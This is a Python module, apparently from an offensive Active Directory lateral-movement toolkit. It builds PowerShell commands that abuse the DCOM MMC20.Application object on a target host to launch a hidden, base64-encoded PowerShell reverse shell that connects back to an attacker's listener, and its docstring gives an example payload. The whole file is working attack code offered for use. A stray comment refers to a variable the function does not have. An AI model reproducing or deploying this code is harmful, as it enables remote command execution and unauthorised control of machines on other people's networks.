#!/usr/bin/python3
from textwrap import dedent
from ad_lateral_scripts.shells import Shells
from ad_lateral_scripts.connection import Connection

class Dcom(Connection):
    @staticmethod
    def get_ps(username: str, password: str, target_ip: str,
            listen_address: str, listen_port: str) -> str:
        """
        Build and return DCOM commands for a reverse shell back to attacker.

        Example returned string:
        $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.1"))

        $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
        AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
        """

        encoded = Shells.encode_ps_for_e(listen_address, listen_port)
        command_line = "powershell -nop -w hidden -e " + encoded

        dcom_command = dedent(f"""\
        $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target_ip}"))

        $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{command_line}","7")
        """)

        # Wrap the inner command in double quotes so shell grouping is preserved
        # No further escaping is done here — if inner_cmd contains double quotes, caller should escape them.
        return dcom_command